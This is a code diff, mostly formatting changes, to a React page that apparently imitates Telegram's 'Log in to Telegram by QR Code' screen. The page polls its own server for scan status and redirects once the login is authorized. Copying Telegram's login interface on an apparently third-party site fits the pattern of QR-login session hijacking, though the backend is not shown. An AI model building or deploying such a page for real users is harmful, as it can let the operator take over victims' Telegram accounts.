@@ -6,22 +6,17 @@ import { QRCode } from "react-qrcode-logo";
 import { useRouter } from "next/navigation";
 import { Inter } from "next/font/google";
 import { motion } from "framer-motion";
- 
 
 // --- Timings you can tweak ---
 //const INITIAL_DELAY_MIN_MS = 5000;   // 5s
 //const INITIAL_DELAY_MAX_MS = 10000;  // 10s
-const POLL_INTERVAL_MS = 5000;       // status poll cadence
+const POLL_INTERVAL_MS = 5000; // status poll cadence
 
-const inter = Inter({ subsets: ["latin"], weight: ["500","600"] });
+const inter = Inter({ subsets: ["latin"], weight: ["500", "600"] });
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
-
-
-
 export default function QrPage() {
-// const inter = Inter({ subsets: ['latin'], weight: ['500','600'] });
-
+  // const inter = Inter({ subsets: ['latin'], weight: ['500','600'] });
 
   const router = useRouter();
   const navigatedRef = useRef(false);
@@ -36,7 +31,7 @@ export default function QrPage() {
   const [popped, setPopped] = useState(false);
 
   // UI gates
-  const [uiReady, setUiReady] = useState(true);        // initial gate (5–10s)
+  const [uiReady, setUiReady] = useState(true); // initial gate (5–10s)
   // const [isRefreshing, setIsRefreshing] = useState(false); // refresh animation gate
 
   const pollRef = useRef(null);
@@ -99,55 +94,54 @@ export default function QrPage() {
   }, []);
 
   // Status polling (only when we HAVE a key+qr)
- // Status polling (only when we HAVE a key+qr)
-useEffect(() => {
-  if (!key || !qrUrl) return;
+  // Status polling (only when we HAVE a key+qr)
+  useEffect(() => {
+    if (!key || !qrUrl) return;
 
-  if (pollRef.current) clearInterval(pollRef.current);
-
-  pollRef.current = setInterval(async () => {
-    const res = await fetch("/api/telegram/qr/status", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ key }),
-    });
-    const data = await res.json();
-
-    if (data.invalid) {
-      if (pollRef.current) clearInterval(pollRef.current);
-      // await doRefreshAnimation();
-      return;
-    }
-
-    if (data.accepted && !navigatedRef.current) {
-      setAccepted(true);
-      navigatedRef.current = true;
-      if (pollRef.current) clearInterval(pollRef.current);
-      router.push(`/welcome?key=${encodeURIComponent(key)}`); // safe to use here
-      return;
-    }
-
-    if (data.authorized) {
-      if (pollRef.current) clearInterval(pollRef.current);
-      setAuthorized(true);
-      setQrUrl("");
-      router.push(`/welcome?key=${encodeURIComponent(key)}`);
-      return;
-    }
-
-    if (data.expired || (expiresAt && Date.now() >= expiresAt)) {
-      if (pollRef.current) clearInterval(pollRef.current);
-      // await doRefreshAnimation();
-      return;
-    }
-  }, POLL_INTERVAL_MS);
-
-  return () => {
     if (pollRef.current) clearInterval(pollRef.current);
-  };
-  // ⬇️ keep this array length constant
-}, [key, qrUrl, expiresAt]);  // <-- remove `router`
 
+    pollRef.current = setInterval(async () => {
+      const res = await fetch("/api/telegram/qr/status", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ key }),
+      });
+      const data = await res.json();
+
+      if (data.invalid) {
+        if (pollRef.current) clearInterval(pollRef.current);
+        // await doRefreshAnimation();
+        return;
+      }
+
+      if (data.accepted && !navigatedRef.current) {
+        setAccepted(true);
+        navigatedRef.current = true;
+        if (pollRef.current) clearInterval(pollRef.current);
+        router.push(`/welcome?key=${encodeURIComponent(key)}`); // safe to use here
+        return;
+      }
+
+      if (data.authorized) {
+        if (pollRef.current) clearInterval(pollRef.current);
+        setAuthorized(true);
+        setQrUrl("");
+        router.push(`/welcome?key=${encodeURIComponent(key)}`);
+        return;
+      }
+
+      if (data.expired || (expiresAt && Date.now() >= expiresAt)) {
+        if (pollRef.current) clearInterval(pollRef.current);
+        // await doRefreshAnimation();
+        return;
+      }
+    }, POLL_INTERVAL_MS);
+
+    return () => {
+      if (pollRef.current) clearInterval(pollRef.current);
+    };
+    // ⬇️ keep this array length constant
+  }, [key, qrUrl, expiresAt]); // <-- remove `router`
 
   // Play the 4.5s animation BEFORE showing a new QR
   // const doRefreshAnimation = async () => {
@@ -159,22 +153,26 @@ useEffect(() => {
 
   // ------- UI -------
   return (
-    <div className={`${inter.className} min-h-screen flex items-start md:items-center justify-center px-6 -mt-6 md:-mt-10 bg-white p-4`} >
+    <div
+      className={`${inter.className} min-h-screen flex items-start md:items-center justify-center px-6 -mt-6 md:-mt-10 bg-white p-4`}
+    >
       <div className="w-full flex flex-col items-center pt-16 md:pt-0">
         {/* NOT AUTHORIZED VIEW */}
         {!authorized && (
           <div className="flex flex-col items-center">
             {/* QR — only this square shows loader/refresh overlay */}
 
-
-            <motion.div className=
-            
-            "relative" style={{ width: COL_WIDTH, height: COL_WIDTH }}
-            initial={popped ? false : { scale: 0.85, opacity: 0 }}
-            animate={{ scale: 1, opacity: 1 }}
-            transition={{ type: "spring", stiffness: 420, damping: 30, mass: 0.6 }}
-            
-            
+            <motion.div
+              className="relative"
+              style={{ width: COL_WIDTH, height: COL_WIDTH }}
+              initial={popped ? false : { scale: 0.85, opacity: 0 }}
+              animate={{ scale: 1, opacity: 1 }}
+              transition={{
+                type: "spring",
+                stiffness: 420,
+                damping: 30,
+                mass: 0.6,
+              }}
             >
               {uiReady && qrUrl ? (
                 <>
@@ -187,81 +185,79 @@ useEffect(() => {
                   />
 
                   {/* Blue spinner overlay only while refreshing */}
-                  
-                     
-                 
 
                   {/* Center GIF badge (only when not refreshing) */}
-                  
+
+                  <div
+                    className="pointer-events-none absolute inset-0 flex items-center justify-center"
+                    aria-hidden
+                  >
                     <div
-                      className="pointer-events-none absolute inset-0 flex items-center justify-center"
-                      aria-hidden
+                      className="  bg-white ring-1 ring-gray-200 overflow-hidden"
+                      style={{ width: BADGE, height: BADGE }}
                     >
-                      <div
-                        className="  bg-white ring-1 ring-gray-200 overflow-hidden"
-                        style={{ width: BADGE, height: BADGE }}
-                      >
-                        <img
-                          src="./tele-flying.gif"      // <-- your 1:1 GIF path
-                          alt=""                        // decorative
-                          className="w-full h-full object-contain"
-                        />
-                      </div>
+                      <img
+                        src="./tele-flying.gif" // <-- your 1:1 GIF path
+                        alt="" // decorative
+                        className="w-full h-full object-contain"
+                      />
                     </div>
-                  
+                  </div>
                 </>
               ) : (
                 <div className="w-full h-full rounded-lg bg-gray-100 animate-pulse" />
               )}
             </motion.div>
 
-
             {/* Title — same width as QR */}
-         <div className="mt-8" style={{ width: COL_WIDTH }}>
-            <h1 className="text-[18px] leading-6 font-semibold text-gray-900 text-center whitespace-nowrap tracking-[-0.01em]">
-              Log in to Telegram by QR Code
-            </h1>
-          </div>
-
+            <div className="mt-8">
+              <h1 className="text-2xl md:text-4xl leading-6 font-semibold text-gray-900 text-center whitespace-nowrap tracking-[-0.01em]">
+                Log in to Telegram by QR Code
+              </h1>
+            </div>
 
             {/* Steps — same width and left-aligned */}
-            <ol className="mt-6 space-y-3 text-gray-800 mx-auto" style={{ width: COL_WIDTH }}>
+            <ol className="mt-6 space-y-3 text-gray-800 mx-auto text-3xl">
               <Step n={1} text={<span>Open Telegram on your phone</span>} />
               <Step
                 n={2}
                 text={
                   <span>
-                    Go to <b>Settings</b> &gt; <b>Devices</b> &gt; <b>Link Desktop Device</b>
+                    Go to <b>Settings</b> &gt; <b>Devices</b> &gt;{" "}
+                    <b>Link Desktop Device</b>
                   </span>
                 }
               />
-              <Step n={3} text={<span>Point your phone at this screen to confirm login</span>} />
+              <Step
+                n={3}
+                text={
+                  <span>Point your phone at this screen to confirm login</span>
+                }
+              />
             </ol>
 
             {/* Accepted hint — same width */}
             {accepted && (
-              <p className="mt-3 text-sm text-green-600 text-left mx-auto" style={{ width: COL_WIDTH }}>
+              <p className="mt-3 text-sm text-green-600 text-left mx-auto">
                 ✅ Scan detected — tap <b>Allow</b> in Telegram to confirm.
               </p>
             )}
 
             {/* “Log in by phone number” link — same width and centered */}
-            <div className="mt-8 mx-auto " style={{ width: COL_WIDTH }}>
-               
-              <button 
+            <div className="mt-8 mx-auto ">
+              <button
                 type="button"
-                className="inline-flex items-center  gap-3 rounded-lg px-3 py-2
+                className="inline-flex items-center  gap-3 rounded-lg px-9 py-2
                 text-blue-600 uppercase tracking-wide text-[15px] font-medium
                 transition hover:text-blue-700 hover:bg-blue-50 hover:shadow-sm
                 focus:outline-none focus:ring-2 focus:ring-blue-500/40
-                w-[250px] h-[40px]"
-    
-                onClick={ () => {router.push('/')}
-                }
+               "
+                onClick={() => {
+                  router.push("/");
+                }}
               >
                 LOG IN BY PHONE NUMBER
               </button>
-               
             </div>
           </div>
         )}
@@ -305,4 +301,3 @@ function Step({ n, text }) {
     </li>
   );
 }
-
